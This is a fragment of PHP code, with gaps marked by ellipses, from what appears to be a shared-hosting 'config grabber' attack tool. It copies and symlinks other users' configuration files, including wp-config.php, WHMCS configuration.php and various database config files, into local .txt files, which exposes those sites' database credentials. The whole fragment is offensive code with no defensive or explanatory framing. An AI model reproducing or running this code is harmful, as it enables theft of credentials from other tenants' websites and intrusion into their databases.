...
copy('/'.$home.'/'.$user.'/public_html/db/config.php',$user.'custom.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/db/config.php',$user.'custom.txt'); 
...
copy('/'.$home.'/'.$user.'/public_html/WHM/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/WHMCS/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/config/connection.php',$user.'conf1g.txt'); 
copy('/'.$home.'/clients/'.$user.'/public_html/wp-config.php',$user.'conf1g.txt'); 
copy('/'.$home.'/clients/'.$user.'/public_html/includes/config/db_config.php',$user.'conf1g.txt'); 
symlink('/'.$home.'/clients/'.$user.'/public_html/includes/config/db_config.php',$user.'conf1g.txt'); 
symlink('/'.$home.'/clients/'.$user.'/public_html/wp-config.php',$user.'conf1g.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/config/connection.php',$user.'conf1g.txt'); 
...
copy('/'.$home.'/'.$user.'/public_html/application/admin/config/database.php',$user.'npgov.txt');
symlink('/'.$home.'/'.$user.'/public_html/application/admin/config/database.php',$user.'npgov.txt');
}
